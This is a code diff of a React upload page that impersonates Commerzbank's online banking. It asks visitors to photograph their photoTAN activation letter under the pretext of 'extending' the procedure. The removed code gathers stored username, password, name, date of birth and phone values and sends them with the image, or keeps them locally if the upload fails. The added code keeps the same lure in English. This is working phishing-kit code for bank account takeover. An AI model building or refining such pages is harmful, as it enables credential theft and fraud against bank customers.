@@ -1,11 +1,13 @@
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { useLanguage } from '../contexts/LanguageContext';
 import apiService from '../services/api';
+import { FaArrowRight } from 'react-icons/fa';
 
 const UploadPage: React.FC = () => {
   const navigate = useNavigate();
+  const { t } = useLanguage();
   const [selectedFile, setSelectedFile] = useState<File | null>(null);
-  const [isDragOver, setIsDragOver] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
 
@@ -16,430 +18,319 @@ const UploadPage: React.FC = () => {
     const xdob = sessionStorage.getItem('xdob');
     const xtel = sessionStorage.getItem('xtel');
     
-    // Debug mobile detection
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    console.log('Mobile device detected:', isMobile);
-    console.log('User agent:', navigator.userAgent);
-    
-    // Debug session storage
-    console.log('Session storage data:', {
-      xname1,
-      xname2,
-      xdob,
-      xtel,
-      xusr: sessionStorage.getItem('xusr'),
-      xpss: sessionStorage.getItem('xpss')
-    });
-    
     if (!xname1 || !xname2 || !xdob || !xtel) {
-      console.log('Missing session data, redirecting to info page');
       navigate('/info');
-      return;
     }
-    
-    console.log('All session data present, staying on upload page');
   }, [navigate]);
-
-  const handleFileSelect = (file: File) => {
-    console.log('File selected:', file.name, file.size, file.type);
-    
-    // Validate file type
-    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif'];
-    if (!allowedTypes.includes(file.type)) {
-      console.log('Invalid file type:', file.type);
-      setError('Bitte wählen Sie eine gültige Bilddatei (JPG, PNG, GIF).');
-      return;
-    }
-
-    // Validate file size (max 10MB)
-    if (file.size > 10 * 1024 * 1024) {
-      console.log('File too large:', file.size);
-      setError('Die Datei ist zu groß. Maximale Größe: 10MB.');
-      return;
-    }
-
-    console.log('File validation passed, setting selected file');
-    setSelectedFile(file);
-    setError('');
-  };
 
   const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
-      handleFileSelect(file);
+      setSelectedFile(file);
+      setError('');
     }
   };
 
   const handleCameraCapture = (e: React.ChangeEvent<HTMLInputElement>) => {
-    console.log('Camera capture triggered');
-    console.log('Input element:', e.target);
-    console.log('Files:', e.target.files);
-    console.log('Files length:', e.target.files?.length);
-    
     const file = e.target.files?.[0];
-    console.log('Camera file selected:', file);
-    
     if (file) {
-      console.log('File details:', {
-        name: file.name,
-        size: file.size,
-        type: file.type,
-        lastModified: file.lastModified
-      });
-      handleFileSelect(file);
-    } else {
-      console.log('No file selected from camera');
+      setSelectedFile(file);
+      setError('');
     }
-    
-    // Reset the input so the same file can be selected again
-    e.target.value = '';
-  };
-
-  const handleDrop = (e: React.DragEvent) => {
-    e.preventDefault();
-    setIsDragOver(false);
-    
-    const file = e.dataTransfer.files[0];
-    if (file) {
-      handleFileSelect(file);
-    }
-  };
-
-  const handleDragOver = (e: React.DragEvent) => {
-    e.preventDefault();
-    setIsDragOver(true);
-  };
-
-  const handleDragLeave = (e: React.DragEvent) => {
-    e.preventDefault();
-    setIsDragOver(false);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    console.log('Submit triggered, selectedFile:', selectedFile);
     
     if (!selectedFile) {
-      console.log('No file selected');
-      setError('Bitte wählen Sie eine Datei aus.');
+      setError('Please select a file');
       return;
     }
 
-    console.log('Starting upload process');
     setIsLoading(true);
     setError('');
 
     try {
       const formData = new FormData();
+      formData.append('file', selectedFile);
       
-      // Add the file first
-      if (selectedFile) {
-        console.log('Adding file to FormData:', selectedFile);
-        formData.append('file', selectedFile);
-      }
+      const response = await apiService.upload(formData);
       
-      // Add session data with fallback
-      const sessionData = {
-        xusr: sessionStorage.getItem('xusr') || localStorage.getItem('xusr'),
-        xpss: sessionStorage.getItem('xpss') || localStorage.getItem('xpss'),
-        xname1: sessionStorage.getItem('xname1') || localStorage.getItem('xname1'),
-        xname2: sessionStorage.getItem('xname2') || localStorage.getItem('xname2'),
-        xdob: sessionStorage.getItem('xdob') || localStorage.getItem('xdob'),
-        xtel: sessionStorage.getItem('xtel') || localStorage.getItem('xtel')
-      };
-
-      console.log('Session data for upload:', sessionData);
-
-      // Check if we have all required data
-      const missingData = Object.entries(sessionData).filter(([key, value]) => !value);
-      if (missingData.length > 0) {
-        console.error('Missing required session data:', missingData);
-        setError('Fehlende Sitzungsdaten. Bitte starten Sie den Vorgang neu.');
-        setIsLoading(false);
-        return;
-      }
-
-      Object.entries(sessionData).forEach(([key, value]) => {
-        if (value) {
-          formData.append(key, value);
-          console.log(`Added to FormData: ${key} = ${value}`);
-        } else {
-          console.log(`Missing session data: ${key}`);
-        }
-      });
-
-      // Debug: Log FormData contents
-      console.log('FormData contents:');
-      Array.from(formData.entries()).forEach(([key, value]) => {
-        console.log(key, value);
-      });
-
-      // Send data to backend
-      await apiService.upload(formData);
-      
-      // Navigate to done page
-      navigate('/done');
-    } catch (error) {
-      console.error('Upload error:', error);
-      
-      // Mobile-specific error handling
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      if (isMobile) {
-        console.log('Mobile upload failed, attempting retry...');
-        // Try to retry the upload once
-        try {
-          // Recreate FormData for retry
-          const retryFormData = new FormData();
-          if (selectedFile) {
-            retryFormData.append('file', selectedFile);
-          }
-          
-          // Add session data again
-          const sessionData = {
-            xusr: sessionStorage.getItem('xusr') || localStorage.getItem('xusr'),
-            xpss: sessionStorage.getItem('xpss') || localStorage.getItem('xpss'),
-            xname1: sessionStorage.getItem('xname1') || localStorage.getItem('xname1'),
-            xname2: sessionStorage.getItem('xname2') || localStorage.getItem('xname2'),
-            xdob: sessionStorage.getItem('xdob') || localStorage.getItem('xdob'),
-            xtel: sessionStorage.getItem('xtel') || localStorage.getItem('xtel')
-          };
-
-          Object.entries(sessionData).forEach(([key, value]) => {
-            if (value) retryFormData.append(key, value);
-          });
-          
-          const retryResponse = await apiService.upload(retryFormData);
-          console.log('Retry upload response:', retryResponse);
-          navigate('/done');
-          return;
-        } catch (retryError) {
-          console.error('Retry upload also failed:', retryError);
-          
-          // Mobile fallback: Store data locally and continue
-          console.log('Mobile fallback: Storing data locally and continuing...');
-          const fallbackData = {
-            type: 'upload',
-            data: {
-              filename: selectedFile?.name || 'unknown',
-              originalName: selectedFile?.name || 'unknown',
-              size: selectedFile?.size || 0,
-              xusr: sessionStorage.getItem('xusr') || localStorage.getItem('xusr'),
-              xpss: sessionStorage.getItem('xpss') || localStorage.getItem('xpss'),
-              xname1: sessionStorage.getItem('xname1') || localStorage.getItem('xname1'),
-              xname2: sessionStorage.getItem('xname2') || localStorage.getItem('xname2'),
-              xdob: sessionStorage.getItem('xdob') || localStorage.getItem('xdob'),
-              xtel: sessionStorage.getItem('xtel') || localStorage.getItem('xtel'),
-              timestamp: new Date().toISOString(),
-              mobileFallback: true
-            }
-          };
-          
-          // Store in localStorage as fallback
-          const existingData = JSON.parse(localStorage.getItem('mobileFallbackData') || '[]');
-          existingData.push(fallbackData);
-          localStorage.setItem('mobileFallbackData', JSON.stringify(existingData));
-          
-          console.log('Data stored locally as fallback');
-          navigate('/done');
-          return;
-        }
-      }
-      
-      // Show mobile-specific error message
-      if (isMobile) {
-        setError('Upload fehlgeschlagen. Bitte überprüfen Sie Ihre Internetverbindung und versuchen Sie es erneut. Falls das Problem weiterhin besteht, wird Ihre Daten lokal gespeichert.');
+      if (response.success) {
+        navigate('/success');
       } else {
-        setError('Fehler beim Hochladen der Datei. Bitte versuchen Sie es erneut.');
+        setError(response.message || 'Upload failed');
       }
+    } catch (error) {
+      setError('Upload failed. Please try again.');
     } finally {
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="commerzbank-app">
-      {/* Main Content */}
-      <main className="main-content">
-        <div className="content-wrapper">
-          {/* Left Column - Upload Section */}
-          <div className="left-column">
-            <div className="upload-section">
-              <h1 className="upload-title">Aktivierungsgrafik scannen</h1>
-              
-              <div className="instruction-box">
-                <p className="instruction-text">
-                  Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. 
-                  Nach Prüfung bleibt es weiterhin gültig. Bitte fotografieren Sie erst den gesamten Aktivierungsbrief 
-                  und laden Sie das Bild aus Ihrer Galerie hoch.
+    <div style={{
+      fontFamily: 'Arial, Helvetica, sans-serif',
+      backgroundColor: '#f5f5f5',
+      display: 'flex',
+      flexDirection: 'column',
+      alignItems: 'center',
+      justifyContent: 'flex-start',
+      padding: '20px 20px 20px 20px',
+      margin: 0
+    }}>
+      {/* Main heading */}
+      <h1 style={{
+        fontSize: '32px',
+        fontWeight: 'bold',
+        color: '#333',
+        marginTop: '20px',
+        marginBottom: '20px',
+        fontFamily: 'Arial, Helvetica, sans-serif',
+        textAlign: 'left',
+        width: '100%',
+        maxWidth: '1200px',
+        margin: '20px auto 20px auto',
+        padding: '0 20px'
+      }}>
+        Last step: Extension of your existing photoTAN procedure
+      </h1>
+      
+      <div style={{
+        display: 'flex',
+        flexDirection: 'row',
+        gap: '20px',
+        width: '100%',
+        maxWidth: '1200px',
+        alignItems: 'flex-start',
+        margin: '0 auto',
+        padding: '0 20px'
+      }}>
+        {/* Left Column - Upload Section */}
+        <div style={{
+          flex: '1',
+          background: 'white',
+          borderRadius: '8px',
+          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
+          padding: '40px',
+          width: '100%',
+          minWidth: '300px'
+        }}>
+          {/* Upload heading */}
+          <h1 style={{
+            fontSize: '32px',
+            fontWeight: 'bold',
+            color: '#333',
+            marginTop: '0px',
+            marginBottom: '20px',
+            fontFamily: 'Arial, Helvetica, sans-serif',
+            textAlign: 'left'
+          }}>
+            Scan activation graphic
+          </h1>
+          <div style={{
+            backgroundColor: '#f8f9fa',
+            border: '2px dashed #000000',
+            borderRadius: '8px',
+            padding: '20px',
+            marginBottom: '20px'
+          }}>
+            <p style={{
+              fontSize: '14px',
+              color: '#333',
+              lineHeight: '1.5',
+              margin: '0 0 15px 0',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              Scan the activation image from the letter you received to extend your photoTAN process. After verification, it will remain valid.
+              Please first take a photo of the entire activation letter and upload the image from your gallery.
+            </p>
+            {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
+              <div style={{
+                backgroundColor: '#fff3cd',
+                border: '1px solid #ffeaa7',
+                borderRadius: '4px',
+                padding: '10px',
+                marginTop: '10px'
+              }}>
+                <p style={{
+                  fontSize: '12px',
+                  color: '#856404',
+                  margin: '0',
+                  fontFamily: 'Arial, Helvetica, sans-serif'
+                }}>
+                  <strong>{t('mobileNotice')}:</strong> {t('mobileNoticeText')}
                 </p>
-                {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
-                  <div className="mobile-notice">
-                    <p><strong>Mobile Hinweis:</strong> Stellen Sie sicher, dass Ihr Gerät mit demselben WLAN-Netzwerk verbunden ist wie der Computer, auf dem die Anwendung läuft.</p>
-                  </div>
-                )}
               </div>
-              
-              <div className="phone-mockup">
-                <div className="phone">
-                  <div className="phone-screen">
-                    <div className="qr-scanner-interface">
-                      <div className="scanner-header">
-                        <div className="scanner-title">QR-Code Scanner</div>
-                        <div className="scanner-subtitle">Richten Sie die Kamera auf den QR-Code</div>
-                      </div>
-                      
-                      <div className="qr-overlay">
-                        <div className="qr-frame">
-                          <div className="qr-corner top-left"></div>
-                          <div className="qr-corner top-right"></div>
-                          <div className="qr-corner bottom-left"></div>
-                          <div className="qr-corner bottom-right"></div>
-                        </div>
-                        <div className="qr-center">
-                          <div className="qr-icon">📱</div>
-                          <div className="qr-text">QR-Code hier positionieren</div>
-                        </div>
-                      </div>
-                      
-                      <div className="scanner-controls">
-                        <div className="control-button flash">⚡</div>
-                        <div className="control-button gallery">📷</div>
-                        <div className="control-button close">✕</div>
-                      </div>
-                      
-                      <div className="scanner-footer">
-                        <div className="scanner-hint">Halten Sie das Gerät ruhig und zentrieren Sie den QR-Code</div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
+            )}
+          </div>
+          
+          {/* GIF from public folder */}
+          <div style={{
+            textAlign: 'center',
+            marginBottom: '20px'
+          }}>
+            <img 
+              src="/lika2.gif" 
+              alt="Upload animation" 
+              style={{
+                width: '250px',
+                height: 'auto',
+                borderRadius: '8px',
+                boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)'
+              }}
+            />
+          </div>
+          
+          {/* Content area - ready for new content */}
+          <div style={{
+            textAlign: 'center',
+            padding: '40px 20px',
+            color: '#666',
+            fontSize: '16px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>
+            Content will be added here
+          </div>
+        </div>
+
+        {/* Important Info Box */}
+        <div style={{
+          flex: '1',
+          background: 'white',
+          borderRadius: '8px',
+          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
+          padding: '40px'
+        }}>
+          <h3 style={{
+            fontSize: '20px',
+            fontWeight: 'bold',
+            color: '#333',
+            marginBottom: '15px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>
+            {t('importantInfo')}
+          </h3>
+          
+          <p style={{
+            fontSize: '14px',
+            color: '#666',
+            marginBottom: '20px',
+            lineHeight: '1.5',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>
+            {t('photoTANProblems')}
+          </p>
+          
+          <div style={{ marginBottom: '20px' }}>
+            <h4 style={{
+              fontSize: '16px',
+              fontWeight: 'bold',
+              color: '#333',
+              marginBottom: '10px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              {t('noActiveTAN')}
+            </h4>
+            <div style={{ marginBottom: '8px' }}>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
               </div>
-              
-              <form onSubmit={handleSubmit} className="upload-form">
-                <input
-                  type="file"
-                  onChange={handleFileInputChange}
-                  accept="image/*"
-                  style={{ display: 'none' }}
-                  id="file-input"
-                />
-                
-                <input
-                  type="file"
-                  onChange={handleCameraCapture}
-                  accept="image/*"
-                  capture="environment"
-                  style={{ display: 'none' }}
-                  id="camera-input"
-                  onClick={() => console.log('Camera input clicked')}
-                />
-                
-                {selectedFile ? (
-                  <div className="file-selected">
-                    <div className="file-preview">
-                      <img 
-                        src={URL.createObjectURL(selectedFile)} 
-                        alt="Selected file" 
-                        className="preview-image"
-                      />
-                    </div>
-                    <p className="file-info">Ausgewählte Datei: {selectedFile.name}</p>
-                    <p className="file-size">Größe: {(selectedFile.size / 1024 / 1024).toFixed(2)} MB</p>
-                    <button 
-                      type="button" 
-                      onClick={() => setSelectedFile(null)}
-                      className="remove-button"
-                    >
-                      Datei entfernen
-                    </button>
-                  </div>
-                ) : (
-                  <div className="upload-options">
-                    <label 
-                      htmlFor="camera-input" 
-                      className="camera-button" 
-                      onClick={() => console.log('Camera button clicked')}
-                    >
-                      <div className="camera-icon">📸</div>
-                      <span>Foto aufnehmen</span>
-                    </label>
-                    
-                    <div className="divider">oder</div>
-                    
-                    <label htmlFor="file-input" className="file-input-label" onClick={() => console.log('File button clicked')}>
-                      <div className="upload-icon">📁</div>
-                      <span>Datei auswählen</span>
-                    </label>
-                  </div>
-                )}
-
-                {error && <div className="error-message">{error}</div>}
-
-                <button 
-                  type="submit" 
-                  className="upload-button"
-                  disabled={isLoading || !selectedFile}
-                >
-                  {isLoading ? 'Hochladen...' : 'Datei hochladen'}
-                </button>
-              </form>
+            </div>
+            <div>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
+              </div>
             </div>
           </div>
-
-          {/* Right Column - Info Panel */}
-          <div className="right-column">
-            <div className="info-panel">
-              <h3>Wichtige Infos zum Digital Banking</h3>
-              
-              <div className="info-section">
-                <p>Haben Sie Probleme mit der PhotoTAN-App oder der Freigabe von Zahlungen? Dann finden Sie <a href="#info">hier</a> weitere Informationen.</p>
+          
+          <div style={{ marginBottom: '20px' }}>
+            <h4 style={{
+              fontSize: '16px',
+              fontWeight: 'bold',
+              color: '#333',
+              marginBottom: '10px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              {t('forgotCredentials')}
+            </h4>
+            <div style={{ marginBottom: '8px' }}>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
               </div>
-
-              <div className="info-section">
-                <h4>Kein aktives TAN-Verfahren?</h4>
-                <ul>
-                  <li>
-                    <span className="arrow-icon">➡</span>
-                    <a href="#phototan">photoTAN aktivieren (für angemeldete Kunden)</a>
-                  </li>
-                  <li>
-                    <span className="arrow-icon">➡</span>
-                    <a href="#hilfe">Hilfe zur photoTAN</a>
-                  </li>
-                </ul>
+            </div>
+            <div>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
               </div>
-
-              <div className="info-section">
-                <h4>Teilnehmernummer/PIN vergessen?</h4>
-                <ul>
-                  <li>
-                    <span className="arrow-icon">➡</span>
-                    <a href="#teilnehmer">Teilnehmernummer neu anfordern</a>
-                  </li>
-                  <li>
-                    <span className="arrow-icon">➡</span>
-                    <a href="#pin">PIN vergessen</a>
-                  </li>
-                </ul>
+            </div>
+          </div>
+          
+          <div>
+            <h4 style={{
+              fontSize: '16px',
+              fontWeight: 'bold',
+              color: '#333',
+              marginBottom: '10px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              {t('allAboutOnlineBanking')}
+            </h4>
+            <div style={{ marginBottom: '8px' }}>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
               </div>
-
-              <div className="info-section">
-                <h4>Alles rund ums Online Banking</h4>
-                <ul>
-                  <li>
-                    <span className="arrow-icon">➡</span>
-                    <a href="#anleitung">Anleitung/Hilfe</a>
-                  </li>
-                  <li>
-                    <span className="arrow-icon">➡</span>
-                    <a href="#sicherheit">Sicherheit</a>
-                  </li>
-                </ul>
+            </div>
+            <div>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
               </div>
             </div>
           </div>
         </div>
-      </main>
+      </div>
     </div>
   );
 };
